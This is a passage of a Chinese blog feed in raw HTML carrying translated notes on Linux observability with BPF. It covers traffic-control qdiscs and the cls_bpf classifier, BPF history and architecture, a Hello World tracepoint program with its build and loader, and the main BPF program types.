packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 32 packets</span><br><span class="line">    TCP 0 UDP 0 ICMP 36 packets</span><br></pre></td></tr></table></figure><h3 id="基于BPF的流量控制分类器"><a href="#基于BPF的流量控制分类器" class="headerlink" title="基于BPF的流量控制分类器"></a>基于BPF的流量控制分类器</h3><p>流量控制是内核数据包调度子系统架构。由决定数据包如何流动以及如何被接受的机制和排队系统组成。流量控制的一些用例包括但不限于以下内容：</p><ul><li>优先处理某些类型的数据包</li><li>丢弃特定类型的数据包</li><li>带宽分配</li></ul><p>一般来说，当你需要重新分配系统中的网络资源时，流量控制是一种可行的方法，为了充分利用它，应该根据你想要运行的应用程序类型部署特定的流量控制配置。流量控制提供了一个可编程的分类器，称为<code>cls_bpf</code>，让钩子进入不同级别的调度操作，它们可以读取和更新套接字缓冲区和数据包元数据，以执行流量整形、跟踪、预处理等操作。</p><p><code>cls_bpf</code>中对eBPF的支持是在内核4.1中实现的，这意味着这种程序可以访问eBPF映射，支持尾调用，可以访问<code>IPv4/IPv6</code>隧道元数据，并且通常使用eBPF附带的帮助程序和实用程序。</p><p>用于与流量控制相关的网络配置进行交互的工具是<code>iproute2</code>套件的一部分，其中包含ip和tc，它们分别用于操作网络接口和流量控制配置。</p><h4 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h4><p>如前所述，<code>Traffic Control</code>和BPF程序之间存在交互点，因此你需要了解一些<code>Traffic Control</code>概念。 如果你已经掌握相关术语，请直接进入示例。</p><h5 id="Queueing-disciplines"><a href="#Queueing-disciplines" class="headerlink" title="Queueing disciplines"></a>Queueing disciplines</h5><p>排队规则(qdisc)定义了调度对象，通过更改发送方式对进入接口的数据包排队；这些对象可以是无类的或有类的。</p><p>默认的<code>qdisc</code>是<code>pfifo_fast</code>，它是无类的，将数据包入队到三个FIFO（先进先出）队列中，这些队列根据它们的优先级出队；此<code>qdisc</code>不用于虚拟设备，例如使用<code>noqueue</code>的环回(lo)或虚拟以太网设备(veth)。除了作为其调度算法的默认值外，<code>pfifo_fast</code>也不需要任何配置即可工作。</p><p>通过访问<code>/sys</code>伪文件系统，可以将虚拟接口与物理接口（设备）区分开来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ls -la /sys/class/net/</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x  2 root root 0 May 16 20:00 .</span><br><span class="line">drwxr-xr-x 66 root root 0 May 16 20:00 ..</span><br><span class="line">lrwxrwxrwx  1 root root 0 May 16 20:00 eth0 -&gt; ../../devices/pci0000:00/0000:00:05.0/virtio0/net/eth0</span><br><span class="line">lrwxrwxrwx  1 root root 0 May 16 20:00 lo -&gt; ../../devices/virtual/net/lo</span><br></pre></td></tr></table></figure><p>如果你从未听说过<code>qdiscs</code>，可以使用<code>ip a</code>命令显示当前系统中配置的网络接口列表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 52:54:00:18:26:89 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.16.14/22 brd 10.0.19.255 scope global noprefixroute eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe18:2689/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>从上述结果我们可以看到</p><ul><li>在我们的系统中有两个网络接口：<code>lo和eth0</code></li><li><code>lo</code>接口是一个虚拟接口，所以它是<code>qdisc noqueue</code></li><li><code>eth0</code>是一个物理接口。 这里的<code>qdisc</code>是<code>fq_codel</code>（公平队列控制延迟）默认不应该是 <code>pfifo_fast</code>吗？ 事实证明，我们正在测试命令的系统正在运行<code>Systemd</code>，它使用内核参数<code>net.core.default_qdisc</code>以不同的方式设置默认<code>qdisc</code>。</li></ul><p><code>noqueue qdisc</code>没有类、调度程序或分类器。它的作用是尝试立即发送数据包。如前所述，虚拟设备默认使用<code>noqueue</code>，但当你删除其当前关联的<code>qdisc</code>时，它也是对任何接口生效的。</p><p><code>fq_codel</code>是一个无类别的<code>qdisc</code>，它使用随机模型对传入的数据包进行分类，以便能够以公平的方式对流量进行排队。</p><p>我们使用ip命令来查找有关<code>qdiscs</code>的信息，但事实证明，在<code>iproute2</code>工具中还有一个名为tc的工具，它具有<code>qdiscs</code>的特定子命令，查看方式如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# tc qdisc ls</span><br><span class="line">qdisc noqueue 0: dev lo root refcnt 2 </span><br><span class="line">qdisc fq_codel 0: dev eth0 root refcnt 2 limit 10240p flows 1024 quantum 1514 target 5ms interval 100ms memory_limit 32Mb ecn drop_batch 64</span><br></pre></td></tr></table></figure><p>对于<code>lo</code>，我们基本上看到与<code>ip a</code>相同的信息，但对于<code>eth0</code>，它具有以下信息：</p><ul><li>它有能够处理10240个传入数据包的限制。</li><li>如前所述，<code>fq_codel</code>使用的随机模型希望将流量排队到不同的流中，此输出包含有关我们拥有多少个流的信息，即1024。</li></ul><p>在下一节中我们可以仔细研究有类和无类<code>qdiscs</code>以了解它们的区别以及哪些适合BPF程序。</p><h5 id="Classful-qdiscs-filters-and-classes"><a href="#Classful-qdiscs-filters-and-classes" class="headerlink" title="Classful qdiscs, filters, and classes"></a>Classful qdiscs, filters, and classes</h5><p><code>Classful qdiscs</code>允许为不同类型的流量定义类，以便对它们应用不同的规则。拥有一个 <code>qdisc</code>的类意味着它可以包含更多的<code>qdisc</code>。有了这种层次结构，我们可以使用过滤器（分类器）通过确定数据包应该入队的下一个类别来对流量进行分类。</p><p>过滤器用于根据数据包的类型将数据包分配给特定的类。 过滤器在一个有类的<code>qdiscs</code>中用于确定数据包应该在哪个类中排队，并且两个或多个过滤器可以映射到同一个类，如下图所示。 每个过滤器都使用分类器根据数据包的信息对数据包进行分类。</p><p><img src="/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/2.png" alt="2"></p><p>如前所述，<code>cls_bpf</code>是我们想用来为流量控制编写BPF程序的分类器——下一节中有一个具体的例子来说明如何使用它。</p><p><code>Classes</code>是只能存在于有类<code>qdisc</code>中的对象；<code>Classes</code>在交通控制中用于创建层次结构。一个类可以附加过滤器，这样就可以实现复杂的层次结构，然后可以将其用作另一个<code>class</code>或<code>qdisc</code>的入口点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第五章节&quot;&gt;&lt;a href=&quot;#第五章节&quot; class=&quot;headerlink&quot; title=&quot;第五章节&quot;&gt;&lt;/a&gt;第五章节&lt;/h2&gt;&lt;h3 id=&quot;BPF实用程序&quot;&gt;&lt;a href=&quot;#BPF实用程序&quot; class=&quot;headerlink&quot; title=&quot;BPF
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>使用BPF的Linux可观测性(上篇)-翻译</title>
    <link href="elssm.github.io/2022/05/27/%E4%BD%BF%E7%94%A8BPF%E7%9A%84Linux%E5%8F%AF%E8%A7%82%E6%B5%8B%E6%80%A7-%E4%B8%8A%E7%AF%87-%E7%BF%BB%E8%AF%91/"/>
    <id>elssm.github.io/2022/05/27/使用BPF的Linux可观测性-上篇-翻译/</id>
    <published>2022-05-27T08:18:52.000Z</published>
    <updated>2022-05-27T08:23:08.182Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一章节"><a href="#第一章节" class="headerlink" title="第一章节"></a>第一章节</h2><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>过去十几年计算机系统变得越来越复杂。关于如何获取软件的行为就已经创造了很多的业务类别，这些业务类别都试图解决观测复杂系统的挑战。一种可观测的方法是分析运行在系统中的程序所产生的数据日志，日志是一种很好的信息源，它们可以为您提供有关应用程序行为的精确数据，然而事实是你只能获取到工程师在创建该程序时暴露在外面的日志信息。从任何系统收集日志格式的信息都可能像反编译程序和查看执行流一样具有挑战性。另一种比较流行的方法是使用指标来解释程序的行为方式。指标在数据格式上不同于日志；日志为你提供了明确的数据，而指标则聚合数据来衡量程序在特定时间点的行为。</p><p>可观测性是一种从不同角度处理这个问题的新兴实践。人们将可观测性定义为我们必须提出任意问题并从任何给定系统接收复杂答案的能力。可观测性、日志和指标聚合之间的一个关键区别在于你所收集的数据。鉴于通过实践可观测性你需要在任何时间点回答任意问题，对数据进行推理的唯一方法是收集系统可以生成的所有数据，并仅在需要回答问题时对其进行聚合。</p><p>黑天鹅事件在软件工程中比我们想象的更普遍，而且是不可避免的。因为我们可以假设我们无法阻止此类事件，所以我们唯一的选择是拥有尽可能多的关于它们的信息来解决它们，而不会对业务系统造成严重影响。可观测性帮助我们构建强大的系统并减轻未来会发生的黑天鹅事件，因为它基于你收集的任何数据可以回答未来所发生的任何问题的前提。对黑天鹅事件的研究和实践可观测性集中在一个中心点，即你从系统收集的数据中。</p><p>Linux容器是Linux内核上一组功能的抽象，用于隔离和管理计算机进程。传统上负责资源管理的内核还提供任务隔离和安全性。在Linux中，容器主要基于<code>namespaces</code>和<code>cgroups</code>。<code>namespaces</code>是将任务彼此隔离的组件。从某种意义上说，当你在一个<code>namespaces</code>中时，你会体验到操作系统就像没有其他任务在计算机上运行一样。<code>cgroups</code> 是提供资源管理的组件。从操作的角度来看，它们可以让你对任何资源使用情况进行细粒度控制，例如 CPU、磁盘 I/O、网络等。在过去十年中，随着Linux容器的普及，软件工程师设计大型分布式系统和计算平台的方式发生了转变。多租户计算已经完全依赖于内核中的这些特性。</p><p>通过如此依赖 Linux 内核的低级功能，我们挖掘了一个新的复杂性和信息来源，我们在设计可观察系统时需要考虑这些来源。内核是一个事件系统，这意味着所有的工作都是基于事件来描述和执行的。打开文件是一种事件，CPU执行任意指令是一种事件，接收网络数据包是一种事件等等。<code>Berkeley Packet Filter</code> (BPF) 是内核中的一个子系统，可以检查这些新的信息源。BPF允许你编写在内核触发任何事件时安全执行的程序。 BPF为你提供强大的安全保证，以防止你在这些程序中注入使系统崩溃的恶意行为。 BPF正在开发新一轮工具，帮助系统开发人员观察和使用这些新平台。</p><h3 id="BPF历史"><a href="#BPF历史" class="headerlink" title="BPF历史"></a>BPF历史</h3><p>1992年的时候出现了一篇名为“The BSD Packet Filter: A New Architecture for User-Level Packet Capture”的论文，在该论文中，作者描述了他们如何为Unix内核实现网络数据包过滤器，该过滤器的速度比当时最先进的数据包过滤器快20倍。包过滤器有一个特定的目的：为监控系统网络的应用程序提供来自内核的直接信息。有了这些信息，应用程序就可以决定如何处理这些数据包。 BPF 在包过滤方面引入了两大创新：</p><ul><li>一种新的虚拟机 (VM)，旨在与基于寄存器的CPU高效工作。</li><li>每个应用程序缓冲区的使用，可以在不复制所有数据包信息的情况下过滤数据包。这最大限度地减少了决策所需的BPF数据量。</li></ul><p>这些巨大的改进使所有Unix系统都采用BPF作为网络数据包过滤的首选技术，放弃了消耗更多内存且性能较低的旧实现。 这种实现仍然存在于该Unix内核的许多衍生产品中，包括Linux内核。</p><p>2014年的时候，Alexei Starovoitov介绍了eBPF的实现。这种新设计针对现代硬件进行了优化，使其生成的指令集比旧BPF解释器生成的机器代码更快。这个扩展版本还将BPF VM中的寄存器数量从两个32位寄存器增加到十个64位寄存器。寄存器数量和位宽的增加为编写更复杂的程序提供了可能性，因为开发人员可以使用函数参数自由地交换更多信息。 这些更改以及其他改进使扩展的BPF版本比原始BPF实现快了四倍。</p><p>这个新实现的最初目标是优化处理网络过滤器的内部BPF指令集。此时，BPF仍然受限于内核空间，只有少数用户空间的程序可以编写BPF过滤器供内核处理，如<code>Tcpdump</code>和<code>Seccomp</code>，今天，这些程序仍然为旧的BPF解释器生成字节码，但内核将这些指令翻译为改进更大的内部表示。</p><p>2014年6月，BPF的扩展版本被暴露给用户空间。 这是BPF的一个转折点。 正如Alexei在引入这些更改的补丁中所写的那样，“这个补丁集展示了eBPF的潜力。”</p><p>BPF成为顶级内核子系统，不再局限于网络堆栈。 BPF程序开始看起来更像内核模块，非常强调安全性和稳定性。 与内核模块不同，BPF程序不需要你重新编译你的内核，并且它们可以保证在不崩溃的情况下完成。</p><p>BPF验证器确保任何BPF程序都将在不崩溃的情况下完成，并确保程序不会尝试访问超出范围的内存。但是，这些优势伴随着某些限制：程序具有允许的最大大小，并且需要限制循环以确保系统的内存永远不会被错误的BPF程序耗尽。</p><p>随着使BPF可以从用户空间访问的更改，内核开发人员还添加了一个新的系统调用，<code>bpf</code>。 这个新的系统调用将成为用户空间和内核之间通信的中心部分。<code>BPF maps</code>将成为内核和用户空间之间交换数据的主要机制。eBPF是本书的起点。 在过去的五年中，BPF自从引入这个扩展版本以来已经发生了显着的变化，我们详细介绍了BPF程序的演变、<code>BPF map</code>和受这种演变影响的内核子系统。</p><h3 id="BPF结构"><a href="#BPF结构" class="headerlink" title="BPF结构"></a>BPF结构</h3><p>正如前面提到的，BPF是一种高度先进的虚拟机，在隔离环境中运行代码指令。 从某种意义上说，你可以将BPF视为你对Java虚拟机(JVM)的看法，这是一个运行由高级编程语言编译的机器代码的专用程序。LLVM之类的编译器和不久的将来的<code>GNU Compiler Collection(GCC)</code>都提供对BPF的支持，允许你将C代码编译成BPF指令。在你的代码被编译之后，BPF使用一个验证器来确保内核可以安全地运行程序。 它可以防止你运行可能使内核崩溃而危及系统的代码。如果你的代码是安全的，BPF程序将被加载到内核中。 Linux内核还包含一个用于BPF指令的即时(JIT)编译器。JIT将在程序验证后直接将BPF字节码转换为机器码，避免了执行时间上的这种开销。这种架构的一个有趣的点是你不需要重新启动系统来加载BPF程序。 你可以按需加载它们，也可以编写自己的初始化脚本，在系统启动时加载BPF程序。</p><p>在内核运行任何BPF程序之前，它需要知道程序<code>attach</code>到了哪个执行点。内核有很多附着点，而且这个数量还在不断增加。当您选择一个执行点时，内核还提供了特定的函数助手，您可以使用它们来处理程序接收到的数据，从而使执行点和BPF程序紧密耦合。</p><p>BPF架构中最后的组件主要负责用户态和内核态之间的数据交换，这个组件叫做<code>BPF map</code>，<code>BPF map</code>是共享数据的双向结构，这意味着你可以从内核和用户空间的两侧写入和读取它们。<code>BPF map</code>有几种类型的结构，从简单的数组和<code>hash map</code>到专门的map，允许你将整个BPF程序保存在其中。</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>我们写这本书是为了帮助你熟悉在日常使用这个Linux子系统时需要用到的基本BPF概念。 BPF仍然是一项正在发展的技术，在我们编写本书的过程中，新的概念和范式也在不断发展。 理想情况下，本书将为你提供BPF基础组件的坚实基础，从而帮助您轻松扩展知识。</p><p>下一章将直接深入BPF程序的结构以及内核如何运行它们。 它还涵盖了内核中可以<code>attach</code>这些程序的点。 这将帮助你熟悉程序可以使用的所有数据以及如何使用这些数据。</p><h2 id="第二章节"><a href="#第二章节" class="headerlink" title="第二章节"></a>第二章节</h2><h3 id="第一个BPF程序"><a href="#第一个BPF程序" class="headerlink" title="第一个BPF程序"></a>第一个BPF程序</h3><p>BPF虚拟机能够运行指令以响应内核触发的事件。然而，并不是所有的BPF程序都可以访问内核触发的所有事件。当你将一个程序加载到BPF虚拟机中时，你需要决定你正在运行哪种类型的程序。这会通知内核你的程序将被触发的位置。它还告诉BPF验证器在你的程序中将允许哪些助手。当你选择程序类型时，你也在选择程序正在实现的接口。 该接口确保你可以访问适当类型的数据，以及你的程序是否可以直接访问网络数据包。</p><p>多年来，内核开发人员一直在添加不同的入口点，你可以将 BPF 程序<code>attach</code>到这些入口点。 这项工作还没有完成，他们每天都在寻找利用BPF的新方法。 在本章中，我们将重点介绍一些最有用的程序类型，目的是让你了解使用BPF可以做什么。 我们将在以后的章节中讨论如何编写BPF程序的许多其他示例。</p><p>本章还将介绍BPF验证器在运行程序中所扮演的角色。 该组件验证你的代码是否可以安全执行，并帮助你编写不会导致意外结果的程序，例如内存耗尽或内核突然崩溃。 </p><h3 id="编写BPF程序"><a href="#编写BPF程序" class="headerlink" title="编写BPF程序"></a>编写BPF程序</h3><p>编写BPF程序的最常见方法是使用<code>LLVM</code>编译的C语言子集。<code>LLVM</code>是一种通用编译器，可以输出不同类型的字节码。在这种情况下，<code>LLVM</code>将输出BPF汇编代码，之后我们会将代码加载到内核中。我们会在以后的章节中展示 BPF汇编的简短示例，编写汇编比C语言更合适，例如<code>Seccomp</code>过滤器来控制内核中的传入系统调用。内核提供系统调用bpf来在程序编译后将它们加载到BPF虚拟机中。 该系统调用用于加载程序之外的其他操作，你将在后面的章节中看到更多使用示例。 内核还提供了一些实用工具，可以为你抽象BPF程序的加载。在第一个代码示例中，我们将展示BPF的“Hello World”示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used))</span></span><br><span class="line"></span><br><span class="line">SEC(<span class="string">"tracepoint/syscalls/sys_enter_execve"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">bpf_prog</span><span class="params">(<span class="keyword">void</span> *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> msg[] = <span class="string">"Hello, BPF World!"</span>; </span><br><span class="line">  bpf_trace_printk(msg, <span class="keyword">sizeof</span>(msg)); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> _license[] SEC(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br></pre></td></tr></table></figure><p>在上面的程序中有一些简单的概念。当我们想要运行这个程序时，我们使用属性<code>SEC</code>来通知BPF虚拟机。在上面BPF例子中，当检测到<code>execve</code>系统调用中的跟踪点时，我们将运行这个BPF程序。跟踪点是内核二进制代码中的静态标记，允许开发人员注入代码来检查内核的执行。所以我们将看到消息<code>Hello，BPF World！</code>每当内核检测到一个程序执行另一个程序时。</p><p>在这个例子的最后，我们还指定了这个程序的许可证。因为Linux内核是在GPL下获得许可的，所以它也只能加载获得GPL许可的程序。 如果我们将许可证设置为其他内容，内核将拒绝加载我们的程序。我们正在使用    <code>bpf_trace_printk</code>在内核跟踪日志中打印一条消息； 该消息你可以在<code>/sys/kernel/debug/tracing/trace_pipe</code>路径下找到此日志。</p><p>我们将使用<code>Clang</code>将第一个程序编译为有效的ELF二进制文件。这是内核期望加载的格式。我们将把我们的第一个程序保存在一个名为<code>bpf_program.c</code>的文件中，以便编译它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br></pre></td></tr></table></figure><p>在这里编译的时候遇到了一个错误。具体报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bpf_program.c:7:3: warning: implicit declaration of function 'bpf_trace_printk' is invalid in C99 [-Wimplicit-function-declaration]</span><br><span class="line">  bpf_trace_printk(msg, sizeof(msg)); </span><br><span class="line">  ^</span><br><span class="line">1 warning generated.</span><br></pre></td></tr></table></figure><p>解决方法：<a href="https://github.com/iovisor/gobpf/issues/267" target="_blank" rel="noopener">https://github.com/iovisor/gobpf/issues/267</a></p><p>重新编译得到<code>bpf_program.o</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -O2 -target bpf -c bpf_program.c -I bpf_helpers.h -o bpf_program.o</span><br></pre></td></tr></table></figure><p>现在我们已经编译了第一个BPF程序，需要将它加载到内核中。我们使用内核提供的特殊帮助器来抽象编译和加载程序。这个帮助程序称为<code>load_bpf_file</code>，它需要一个二进制文件并尝试将其加载到内核中。程序代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;uapi/linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"bpf_load.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (load_bpf_file(<span class="string">"bpf_program.o"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The kernel didn't load the BPF program\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">&#125;</span><br><span class="line">read_trace_pipe(); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们将使用脚本来编译该程序并将其链接为ELF二进制文件。 在这种情况下，我们不需要指定目标，因为该程序不会加载到BPF虚拟机中。 我们需要使用一个外部库，并且编写一个脚本可以更容易地将它们放在一起。</p><p>具体的执行流程如下链接所示</p><p><a href="https://github.com/bpftools/linux-observability-with-bpf/tree/master/code/chapter-2/hello_world" target="_blank" rel="noopener">https://github.com/bpftools/linux-observability-with-bpf/tree/master/code/chapter-2/hello_world</a></p><p>这里需要注意在Makefile中需要将<code>kernel-src</code>修改为你的内核源代码路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# make bpfload</span><br><span class="line">clang -O2 -target bpf -c bpf_program.c -I/root/linux-5.4/tools/testing/selftests/bpf -o bpf_program.o</span><br><span class="line">clang -DHAVE_ATTR_TEST=0 -o monitor-exec -lelf -I/root/linux-5.4/samples/bpf -I/root/linux-5.4/tools/lib -I/root/linux-5.4/tools/perf -I/root/linux-5.4/tools/include -L/usr/local/lib64 -lbpf \</span><br><span class="line">        /root/linux-5.4/samples/bpf/bpf_load.c loader.c</span><br><span class="line">[root@VM-16-14-centos bpf]# ls</span><br><span class="line">Makefile  bpf_helpers.h  bpf_program.c  bpf_program.o  loader.c  monitor-exec</span><br></pre></td></tr></table></figure><p>当你运行这个程序时，你会开始看到我们的Hello, BPF World！ 几秒钟后的消息，即使您没有对计算机执行任何操作。 这是因为在您的计算机后台运行的程序可能正在执行其他调用了<code>execve</code>的程序。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# ./monitor-exec </span><br><span class="line">     barad_agent-20064   [000] d..31  7270.907178: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20067   [000] d..31  7270.909399: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20066   [000] d..31  7270.910152: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20065   [000] d..31  7270.912163: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">     barad_agent-20069   [000] d..31  7273.905863: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20069   [000] d..31  7273.907699: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">     barad_agent-20070   [000] d..31  7273.909361: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20072   [000] d..31  7273.911010: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20071   [000] d..31  7273.912147: bpf_trace_printk: Hello, BPF World!</span><br></pre></td></tr></table></figure><p>当您停止此程序时，该消息将停止显示在您的终端中。 一旦加载 BPF 程序的程序终止，BPF 程序就会从虚拟机中卸载。在接下来的章节中，我们将探讨如何使BPF程序持久化，即使它们的加载器终止之后，因为在许多情况下，我们会希望BPF程序在后台运行，从系统中收集数据，而不管其他进程是否正在运行。现在我们已经了解了BPF程序的基本结构，接下来可以深入了解我们能够编写哪些类型的程序，从而使得我们能够访问Linux内核中的不同子系统。</p><h3 id="BPF程序类型"><a href="#BPF程序类型" class="headerlink" title="BPF程序类型"></a>BPF程序类型</h3><p>尽管程序中没有明确的分类，但我们可以将所有类型分为两类，具体取决于它们的主要用途。</p><p>第一类是追踪(tracing)。 编写的程序会帮助你更好地了解系统中正在发生的事情。它们为你提供有关系统行为及其运行的硬件的直接信息。 它们可以访问与特定程序相关的内存区域，并从正在运行的进程中提取执行跟踪信息。 它们还使你可以直接访问为每个特定进程分配的资源，从文件描述符到CPU和内存的使用情况。</p><p>第二类是网络(networking)。 这些类型的程序允许你检查和操作系统中的网络流量。它们让你过滤来自网络接口的数据包，甚至完全拒绝这些数据包。不同类型的程序可以附着(attach)到内核内网络处理的不同阶段。 这有优点也有缺点。例如，你可以在网络驱动程序接收到数据包后立即将BPF程序附着到网络事件，但是该程序将访问的有关数据包的信息较少，因为内核还没有足够的信息来提供给你。另一方面，您可以在 BPF 程序被传递到用户空间之前立即将它们附加到网络事件。 在这种情况下，你可以获得有关数据包的更多信息，这会帮助你做出更好的决策，但是这样处理成本较高。</p><p>我们接下来展示的程序类型没有分类。我们按照它们被添加到内核的时间顺序来介绍这些类型。 </p><h4 id="Socket-Filter程序"><a href="#Socket-Filter程序" class="headerlink" title="Socket Filter程序"></a>Socket Filter程序</h4><p><code>BPF_PROG_TYPE_SOCKET_FILTER</code>是第一个添加到Linux内核的程序类型。当BPF程序附着到原始套接字时，你可以访问该套接字处理的所有数据包。套接字过滤程序不允许修改这些数据包的内容或更改这些数据包的目的地，它们仅允许你出于可观察性目的访问它们。你的程序接收的元数据包含与网络堆栈相关的信息，例如用于传递数据包的协议类型等。</p><h4 id="Kprobe程序"><a href="#Kprobe程序" class="headerlink" title="Kprobe程序"></a>Kprobe程序</h4><p><code>kprobes</code>是可以动态附加到内核中某些调用点的函数。<code>BPF kprobe</code>程序类型允许你将BPF程序用作<code>kprobe</code>处理程序。 它们使用<code>BPF_PROG_TYPE_KPROBE</code>类型定义。BPF虚拟机确保<code>kprobe</code>程序始终可以安全运行，这是传统<code>kprobe</code>模块的优势。 这里需要强调的是，<code>kprobe</code>不是内核中的稳定入口点，所以你需要确保<code>kprobe BPF</code>程序与你正在使用的特定内核版本兼容。</p><p>当你编写一个附着到<code>kprobe</code>的BPF程序时，你需要决定它是作为函数调用中的第一条指令执行还是在调用完成时执行。你需要在BPF程序的节头中声明此行为。例如，如果你想在内核调用<code>exec</code>系统调用时检查参数，你将在调用开始时附加程序，这个时候需要在头部添加<code>SEC(&quot;kprobe/sys_exec&quot;)</code>。如果要检查调用<code>exec</code>系统调用的返回值，则需要在头部添加<code>SEC(&quot;kretprobe/sys_exec&quot;)</code>。</p><h4 id="Tracepoint程序"><a href="#Tracepoint程序" class="headerlink" title="Tracepoint程序"></a>Tracepoint程序</h4><p>这种类型的程序允许将BPF程序附着到内核提供的跟踪点处理程序。跟踪点程序使用<code>BPF_PROG_TYPE_TRACEPOINT</code>类型定义。跟踪点是内核代码库中的静态标记，允许注入任意代码进行跟踪和调试。它们不如<code>kprobes</code>灵活，因为它们需要事先由内核定义，但在引入内核后就是稳定的。 